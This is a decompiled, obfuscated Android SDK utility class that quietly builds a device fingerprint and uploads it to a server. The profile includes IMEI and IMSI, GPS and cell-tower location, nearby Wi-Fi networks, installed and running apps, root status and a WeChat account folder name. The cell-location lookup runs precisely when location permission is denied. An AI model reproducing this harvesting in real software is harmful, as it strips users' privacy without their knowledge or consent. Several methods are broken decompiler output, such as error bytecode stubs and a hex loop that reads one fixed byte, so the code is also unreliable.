package cn.bmob.v3.util;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.location.Location;
import android.location.LocationManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.telephony.NeighboringCellInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import androidx.core.app.ActivityCompat;
import cn.bmob.v3.http.darkness;
import com.google.gson.JsonElement;
import io.reactivex.Observable;
import io.reactivex.Observer;
import io.reactivex.disposables.Disposable;
import java.io.File;
import java.lang.reflect.Field;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class This
{
  private static char[] Code = { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102 };
  private static MessageDigest V = null;
  
  static
  {
    try
    {
      V = MessageDigest.getInstance("MD5");
      return;
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException) {}
  }
  
  private static final JSONArray B(Context paramContext)
  {
    JSONArray localJSONArray = new JSONArray();
    for (;;)
    {
      try
      {
        paramContext = paramContext.getPackageManager().getInstalledPackages(0).iterator();
        if (paramContext.hasNext())
        {
          PackageInfo localPackageInfo = (PackageInfo)paramContext.next();
          try
          {
            localObject = localPackageInfo.applicationInfo;
            int j = ((ApplicationInfo)localObject).flags;
            i = 1;
            if ((j & 0x1) != 0) {
              break label145;
            }
            if ((((ApplicationInfo)localObject).flags & 0x80) == 0) {
              break label143;
            }
          }
          catch (Throwable localThrowable)
          {
            Object localObject;
            Code(localThrowable);
          }
          localObject = new JSONObject();
          ((JSONObject)localObject).put("pn", localPackageInfo.packageName);
          ((JSONObject)localObject).put("ver", localPackageInfo.versionCode);
          localJSONArray.put(localObject);
          continue;
          continue;
        }
        return localJSONArray;
      }
      catch (Throwable paramContext)
      {
        Code(paramContext);
      }
      label143:
      int i = 0;
      label145:
      if (i == 0) {}
    }
  }
  
  private static final String C(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getResources().getConfiguration().locale.getLanguage();
      return paramContext;
    }
    catch (Throwable paramContext)
    {
      Code(paramContext);
    }
    return null;
  }
  
  /* Error */
  private static String Code(String paramString)
    throws java.io.IOException
  {
    // Byte code:
    //   0: new 149	java/io/File
    //   3: dup
    //   4: aload_0
    //   5: invokespecial 152	java/io/File:<init>	(Ljava/lang/String;)V
    //   8: astore_1
    //   9: new 154	java/io/FileInputStream
    //   12: dup
    //   13: aload_1
    //   14: invokespecial 157	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   17: astore_0
    //   18: aload_0
    //   19: invokevirtual 161	java/io/FileInputStream:getChannel	()Ljava/nio/channels/FileChannel;
    //   22: getstatic 167	java/nio/channels/FileChannel$MapMode:READ_ONLY	Ljava/nio/channels/FileChannel$MapMode;
    //   25: lconst_0
    //   26: aload_1
    //   27: invokevirtual 171	java/io/File:length	()J
    //   30: invokevirtual 177	java/nio/channels/FileChannel:map	(Ljava/nio/channels/FileChannel$MapMode;JJ)Ljava/nio/MappedByteBuffer;
    //   33: astore_1
    //   34: getstatic 36	cn/bmob/v3/util/This:V	Ljava/security/MessageDigest;
    //   37: aload_1
    //   38: invokevirtual 181	java/security/MessageDigest:update	(Ljava/nio/ByteBuffer;)V
    //   41: aload_0
    //   42: invokevirtual 184	java/io/FileInputStream:close	()V
    //   45: getstatic 36	cn/bmob/v3/util/This:V	Ljava/security/MessageDigest;
    //   48: invokevirtual 188	java/security/MessageDigest:digest	()[B
    //   51: invokestatic 191	cn/bmob/v3/util/This:Code	([B)Ljava/lang/String;
    //   54: areturn
    //   55: astore_1
    //   56: goto +6 -> 62
    //   59: astore_1
    //   60: aconst_null
    //   61: astore_0
    //   62: aload_0
    //   63: ifnull +7 -> 70
    //   66: aload_0
    //   67: invokevirtual 184	java/io/FileInputStream:close	()V
    //   70: aload_1
    //   71: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	72	0	paramString	String
    //   8	30	1	localObject1	Object
    //   55	1	1	localObject2	Object
    //   59	12	1	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   18	41	55	finally
    //   9	18	59	finally
  }
  
  private static String Code(byte[] paramArrayOfByte)
  {
    return Code(paramArrayOfByte, 0, paramArrayOfByte.length);
  }
  
  private static String Code(byte[] paramArrayOfByte, int paramInt1, int paramInt2)
  {
    StringBuffer localStringBuffer = new StringBuffer(paramInt2 * 2);
    paramInt1 = 0;
    while (paramInt1 < paramInt2 + 0)
    {
      Code(paramArrayOfByte[1], localStringBuffer);
      paramInt1 += 1;
    }
    return localStringBuffer.toString();
  }
  
  private static final JSONObject Code()
  {
    JSONObject localJSONObject = new JSONObject();
    for (;;)
    {
      Object localObject3;
      int i;
      try
      {
        localJSONObject.put("framework", Code("/system/framework/framework.jar"));
        Object localObject1 = V("/init");
        V.update((byte[])localObject1);
        localJSONObject.put("init", Code(V.digest()));
        localObject1 = new File(Environment.getExternalStorageDirectory(), "/tencent/MicroMsg");
        if (((File)localObject1).isDirectory())
        {
          File[] arrayOfFile = ((File)localObject1).listFiles();
          localObject1 = "";
          localObject3 = localObject1;
          if (arrayOfFile != null)
          {
            int j = arrayOfFile.length;
            i = 0;
            localObject3 = localObject1;
            if (i < j)
            {
              Object localObject4 = arrayOfFile[i];
              localObject3 = localObject1;
              if (localObject4 == null) {
                break label180;
              }
              localObject3 = localObject1;
              if (!((File)localObject4).isDirectory()) {
                break label180;
              }
              localObject4 = ((File)localObject4).getName();
              localObject3 = localObject1;
              if (((String)localObject4).length() <= ((String)localObject1).length()) {
                break label180;
              }
              localObject3 = localObject4;
              break label180;
            }
          }
          if (localObject3.length() > 10)
          {
            localJSONObject.put("wechat", localObject3);
            return localJSONObject;
          }
        }
      }
      catch (Throwable localThrowable)
      {
        Code(localThrowable);
      }
      return localJSONObject;
      label180:
      i += 1;
      Object localObject2 = localObject3;
    }
  }
  
  private static final JSONObject Code(Context paramContext, TelephonyManager paramTelephonyManager)
  {
    JSONObject localJSONObject1 = new JSONObject();
    try
    {
      if ((ActivityCompat.checkSelfPermission(paramContext, "android.permission.ACCESS_FINE_LOCATION") != 0) || (ActivityCompat.checkSelfPermission(paramContext, "android.permission.ACCESS_COARSE_LOCATION") != 0))
      {
        paramContext = (GsmCellLocation)paramTelephonyManager.getCellLocation();
        if (paramContext != null)
        {
          localJSONObject1.put("lac", paramContext.getLac());
          localJSONObject1.put("cid", paramContext.getCid());
          localJSONObject1.put("psc", paramContext.getPsc());
        }
        paramContext = new JSONArray();
        paramTelephonyManager = paramTelephonyManager.getNeighboringCellInfo();
        if ((paramTelephonyManager != null) && (paramTelephonyManager.size() != 0))
        {
          paramTelephonyManager = paramTelephonyManager.iterator();
          while (paramTelephonyManager.hasNext())
          {
            NeighboringCellInfo localNeighboringCellInfo = (NeighboringCellInfo)paramTelephonyManager.next();
            JSONObject localJSONObject2 = new JSONObject();
            localJSONObject2.put("cid", localNeighboringCellInfo.getCid());
            localJSONObject2.put("lac", localNeighboringCellInfo.getLac());
            localJSONObject2.put("rssi", localNeighboringCellInfo.getRssi());
            localJSONObject2.put("psc", localNeighboringCellInfo.getPsc());
            paramContext.put(localJSONObject2);
          }
        }
        localJSONObject1.put("cells", paramContext);
      }
      return localJSONObject1;
    }
    catch (Throwable paramContext) {}
    return localJSONObject1;
  }
  
  private static void Code(byte paramByte, StringBuffer paramStringBuffer)
  {
    char c1 = Code[((paramByte & 0xF0) >> 4)];
    char c2 = Code[(paramByte & 0xF)];
    paramStringBuffer.append(c1);
    paramStringBuffer.append(c2);
  }
  
  public static void Code(Context paramContext)
  {
    JSONObject localJSONObject1 = V(paramContext);
    paramContext = new JSONObject();
    try
    {
      paramContext.put("data", localJSONObject1);
    }
    catch (JSONException localJSONException1)
    {
      localJSONException1.printStackTrace();
    }
    String str = darkness.Code().S();
    cn.bmob.v3.http.This.I().Code(str, paramContext).subscribe(new Observer()
    {
      public final void onComplete()
      {
        thing.V("onCompleted()");
      }
      
      public final void onError(Throwable paramAnonymousThrowable)
      {
        thing.Code(paramAnonymousThrowable.toString());
      }
      
      public final void onSubscribe(Disposable paramAnonymousDisposable) {}
    });
    paramContext = new JSONObject();
    str = darkness.Code().B();
    JSONObject localJSONObject2 = new JSONObject();
    try
    {
      paramContext.put("c", "collect");
      paramContext.put("data", localJSONObject2);
    }
    catch (JSONException localJSONException2)
    {
      localJSONException2.printStackTrace();
    }
    cn.bmob.v3.http.This.I().Code(str, paramContext).subscribe(new Observer()
    {
      public final void onComplete()
      {
        thing.V("onComplete()");
      }
      
      public final void onError(Throwable paramAnonymousThrowable)
      {
        thing.Code(paramAnonymousThrowable.toString());
      }
      
      public final void onSubscribe(Disposable paramAnonymousDisposable) {}
    });
  }
  
  private static void Code(Object paramObject)
  {
    thing.Code("Bmob", paramObject.toString());
  }
  
  private static final JSONArray I(Context paramContext)
  {
    localJSONArray = new JSONArray();
    try
    {
      paramContext = ((WifiManager)paramContext.getSystemService("wifi")).getScanResults();
      if (paramContext != null)
      {
        paramContext = paramContext.iterator();
        while (paramContext.hasNext())
        {
          ScanResult localScanResult = (ScanResult)paramContext.next();
          JSONObject localJSONObject = new JSONObject();
          localJSONObject.put("bssid", localScanResult.BSSID);
          localJSONObject.put("ssid", localScanResult.SSID);
          localJSONArray.put(localJSONObject);
        }
      }
      return localJSONArray;
    }
    catch (Throwable paramContext)
    {
      Code(paramContext);
    }
  }
  
  private static final JSONObject S(Context paramContext)
  {
    JSONObject localJSONObject = new JSONObject();
    try
    {
      LocationManager localLocationManager = (LocationManager)paramContext.getSystemService("location");
      List localList = localLocationManager.getProviders(true);
      String str = null;
      if (localList.contains("gps")) {
        str = "gps";
      } else if (localList.contains("network")) {
        str = "network";
      }
      if ((str != null) && ((ActivityCompat.checkSelfPermission(paramContext, "android.permission.ACCESS_FINE_LOCATION") == 0) || (ActivityCompat.checkSelfPermission(paramContext, "android.permission.ACCESS_COARSE_LOCATION") == 0)))
      {
        paramContext = localLocationManager.getLastKnownLocation(str);
        if (paramContext != null)
        {
          localJSONObject.put("latitude", paramContext.getLatitude());
          localJSONObject.put("longitude", paramContext.getLongitude());
          localJSONObject.put("altitude", paramContext.getAltitude());
          localJSONObject.put("accuracy", paramContext.getAccuracy());
          localJSONObject.put("speed", paramContext.getSpeed());
          localJSONObject.put("time", paramContext.getTime());
        }
      }
      return localJSONObject;
    }
    catch (Throwable paramContext) {}
    return localJSONObject;
  }
  
  private static final JSONObject V()
  {
    localJSONObject = new JSONObject();
    try
    {
      Field[] arrayOfField = Build.class.getDeclaredFields();
      if (arrayOfField != null)
      {
        int j = arrayOfField.length;
        int i = 0;
        while (i < j)
        {
          Field localField = arrayOfField[i];
          localField.setAccessible(true);
          Object localObject2 = localField.get(null);
          if (localObject2 != null)
          {
            Object localObject1 = localObject2;
            if ((localObject2 instanceof Object[])) {
              localObject1 = Arrays.toString((Object[])localObject2);
            }
            localJSONObject.put(localField.getName(), localObject1);
          }
          i += 1;
        }
      }
      return localJSONObject;
    }
    catch (Throwable localThrowable)
    {
      Code(localThrowable);
    }
  }
  
  /* Error */
  private static JSONObject V(Context paramContext)
  {
    // Byte code:
    //   0: new 95	org/json/JSONObject
    //   3: dup
    //   4: invokespecial 96	org/json/JSONObject:<init>	()V
    //   7: astore_2
    //   8: aload_2
    //   9: ldc_w 470
    //   12: getstatic 475	android/os/Build$VERSION:SDK_INT	I
    //   15: invokevirtual 114	org/json/JSONObject:put	(Ljava/lang/String;I)Lorg/json/JSONObject;
    //   18: pop
    //   19: aload_2
    //   20: ldc_w 477
    //   23: aload_0
    //   24: invokestatic 479	cn/bmob/v3/util/This:C	(Landroid/content/Context;)Ljava/lang/String;
    //   27: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   30: pop
    //   31: aload_2
    //   32: ldc_w 481
    //   35: invokestatic 483	cn/bmob/v3/util/This:V	()Lorg/json/JSONObject;
    //   38: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   41: pop
    //   42: aload_2
    //   43: ldc_w 384
    //   46: aload_0
    //   47: invokestatic 485	cn/bmob/v3/util/This:S	(Landroid/content/Context;)Lorg/json/JSONObject;
    //   50: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   53: pop
    //   54: new 149	java/io/File
    //   57: dup
    //   58: ldc_w 487
    //   61: invokespecial 152	java/io/File:<init>	(Ljava/lang/String;)V
    //   64: invokevirtual 490	java/io/File:isFile	()Z
    //   67: ifne +233 -> 300
    //   70: new 149	java/io/File
    //   73: dup
    //   74: ldc_w 492
    //   77: invokespecial 152	java/io/File:<init>	(Ljava/lang/String;)V
    //   80: invokevirtual 490	java/io/File:isFile	()Z
    //   83: ifeq +212 -> 295
    //   86: goto +214 -> 300
    //   89: aload_2
    //   90: ldc_w 494
    //   93: iload_1
    //   94: invokevirtual 497	org/json/JSONObject:put	(Ljava/lang/String;Z)Lorg/json/JSONObject;
    //   97: pop
    //   98: aload_0
    //   99: ldc_w 499
    //   102: invokevirtual 365	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   105: checkcast 266	android/telephony/TelephonyManager
    //   108: astore_3
    //   109: aload_3
    //   110: ifnull +89 -> 199
    //   113: aload_2
    //   114: ldc_w 501
    //   117: aload_0
    //   118: aload_3
    //   119: invokestatic 503	cn/bmob/v3/util/This:Code	(Landroid/content/Context;Landroid/telephony/TelephonyManager;)Lorg/json/JSONObject;
    //   122: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   125: pop
    //   126: aload_2
    //   127: ldc_w 505
    //   130: aload_3
    //   131: invokevirtual 508	android/telephony/TelephonyManager:getNetworkOperator	()Ljava/lang/String;
    //   134: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   137: pop
    //   138: aload_0
    //   139: ldc_w 510
    //   142: invokestatic 262	androidx/core/app/ActivityCompat:checkSelfPermission	(Landroid/content/Context;Ljava/lang/String;)I
    //   145: ifne +22 -> 167
    //   148: aload_2
    //   149: ldc_w 512
    //   152: aload_3
    //   153: invokevirtual 515	android/telephony/TelephonyManager:getDeviceId	()Ljava/lang/String;
    //   156: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   159: pop
    //   160: aload_3
    //   161: invokevirtual 515	android/telephony/TelephonyManager:getDeviceId	()Ljava/lang/String;
    //   164: invokestatic 517	cn/bmob/v3/util/thing:Code	(Ljava/lang/String;)V
    //   167: aload_2
    //   168: ldc_w 519
    //   171: aload_3
    //   172: invokevirtual 522	android/telephony/TelephonyManager:getSubscriberId	()Ljava/lang/String;
    //   175: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   178: pop
    //   179: aload_2
    //   180: ldc_w 398
    //   183: aload_3
    //   184: invokevirtual 525	android/telephony/TelephonyManager:getNetworkType	()I
    //   187: invokevirtual 114	org/json/JSONObject:put	(Ljava/lang/String;I)Lorg/json/JSONObject;
    //   190: pop
    //   191: goto +8 -> 199
    //   194: astore_3
    //   195: aload_3
    //   196: invokestatic 120	cn/bmob/v3/util/This:Code	(Ljava/lang/Object;)V
    //   199: aload_2
    //   200: ldc_w 527
    //   203: aload_0
    //   204: invokestatic 529	cn/bmob/v3/util/This:B	(Landroid/content/Context;)Lorg/json/JSONArray;
    //   207: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   210: pop
    //   211: aload_2
    //   212: ldc_w 531
    //   215: aload_0
    //   216: invokestatic 534	cn/bmob/v3/util/This:Z	(Landroid/content/Context;)Lorg/json/JSONArray;
    //   219: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   222: pop
    //   223: aload_2
    //   224: ldc_w 536
    //   227: invokestatic 538	cn/bmob/v3/util/This:Code	()Lorg/json/JSONObject;
    //   230: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   233: pop
    //   234: aload_2
    //   235: ldc_w 361
    //   238: aload_0
    //   239: invokestatic 540	cn/bmob/v3/util/This:I	(Landroid/content/Context;)Lorg/json/JSONArray;
    //   242: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   245: pop
    //   246: aload_2
    //   247: ldc_w 542
    //   250: new 248	java/lang/String
    //   253: dup
    //   254: ldc_w 544
    //   257: invokestatic 218	cn/bmob/v3/util/This:V	(Ljava/lang/String;)[B
    //   260: invokespecial 546	java/lang/String:<init>	([B)V
    //   263: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   266: pop
    //   267: aload_2
    //   268: ldc_w 548
    //   271: aload_0
    //   272: invokestatic 552	cn/bmob/v3/b/a/c/From:Code	(Landroid/content/Context;)Ljava/lang/String;
    //   275: invokevirtual 106	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   278: pop
    //   279: aload_2
    //   280: areturn
    //   281: astore_0
    //   282: aload_0
    //   283: invokestatic 120	cn/bmob/v3/util/This:Code	(Ljava/lang/Object;)V
    //   286: aload_2
    //   287: areturn
    //   288: astore_3
    //   289: goto -191 -> 98
    //   292: astore_0
    //   293: aload_2
    //   294: areturn
    //   295: iconst_0
    //   296: istore_1
    //   297: goto -208 -> 89
    //   300: iconst_1
    //   301: istore_1
    //   302: goto -213 -> 89
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	305	0	paramContext	Context
    //   93	209	1	bool	boolean
    //   7	287	2	localJSONObject	JSONObject
    //   108	76	3	localTelephonyManager	TelephonyManager
    //   194	2	3	localThrowable1	Throwable
    //   288	1	3	localThrowable2	Throwable
    // Exception table:
    //   from	to	target	type
    //   98	109	194	java/lang/Throwable
    //   113	167	194	java/lang/Throwable
    //   167	191	194	java/lang/Throwable
    //   195	199	281	java/lang/Throwable
    //   8	86	288	java/lang/Throwable
    //   89	98	288	java/lang/Throwable
    //   199	279	292	java/lang/Throwable
  }
  
  /* Error */
  private static byte[] V(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: aconst_null
    //   3: astore_1
    //   4: new 154	java/io/FileInputStream
    //   7: dup
    //   8: aload_0
    //   9: invokespecial 553	java/io/FileInputStream:<init>	(Ljava/lang/String;)V
    //   12: astore_0
    //   13: aload_0
    //   14: invokevirtual 558	java/io/InputStream:available	()I
    //   17: newarray byte
    //   19: astore_2
    //   20: aload_0
    //   21: aload_2
    //   22: invokevirtual 562	java/io/InputStream:read	([B)I
    //   25: pop
    //   26: aload_2
    //   27: astore_1
    //   28: aload_0
    //   29: invokevirtual 563	java/io/InputStream:close	()V
    //   32: aload_2
    //   33: areturn
    //   34: astore_2
    //   35: aload_0
    //   36: astore_1
    //   37: aload_2
    //   38: astore_0
    //   39: goto +28 -> 67
    //   42: goto +7 -> 49
    //   45: astore_0
    //   46: goto +21 -> 67
    //   49: aload_0
    //   50: astore_1
    //   51: iconst_0
    //   52: newarray byte
    //   54: astore_2
    //   55: aload_0
    //   56: ifnull +9 -> 65
    //   59: aload_2
    //   60: astore_1
    //   61: aload_0
    //   62: invokevirtual 563	java/io/InputStream:close	()V
    //   65: aload_2
    //   66: areturn
    //   67: aload_1
    //   68: ifnull +7 -> 75
    //   71: aload_1
    //   72: invokevirtual 563	java/io/InputStream:close	()V
    //   75: aload_0
    //   76: athrow
    //   77: astore_0
    //   78: aload_2
    //   79: astore_0
    //   80: goto -31 -> 49
    //   83: astore_1
    //   84: goto -42 -> 42
    //   87: astore_0
    //   88: aload_1
    //   89: areturn
    //   90: astore_1
    //   91: goto -16 -> 75
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	94	0	paramString	String
    //   3	69	1	localObject1	Object
    //   83	6	1	localThrowable1	Throwable
    //   90	1	1	localThrowable2	Throwable
    //   1	32	2	arrayOfByte1	byte[]
    //   34	4	2	localObject2	Object
    //   54	25	2	arrayOfByte2	byte[]
    // Exception table:
    //   from	to	target	type
    //   13	26	34	finally
    //   4	13	45	finally
    //   51	55	45	finally
    //   4	13	77	java/lang/Throwable
    //   13	26	83	java/lang/Throwable
    //   28	32	87	java/lang/Throwable
    //   61	65	87	java/lang/Throwable
    //   71	75	90	java/lang/Throwable
  }
  
  private static final JSONArray Z(Context paramContext)
  {
    localJSONArray = new JSONArray();
    try
    {
      paramContext = ((ActivityManager)paramContext.getSystemService("activity")).getRunningTasks(Integer.MAX_VALUE).iterator();
      while (paramContext.hasNext()) {
        localJSONArray.put(((ActivityManager.RunningTaskInfo)paramContext.next()).baseActivity.getPackageName());
      }
      return localJSONArray;
    }
    catch (Throwable paramContext)
    {
      Code(paramContext);
    }
  }
}
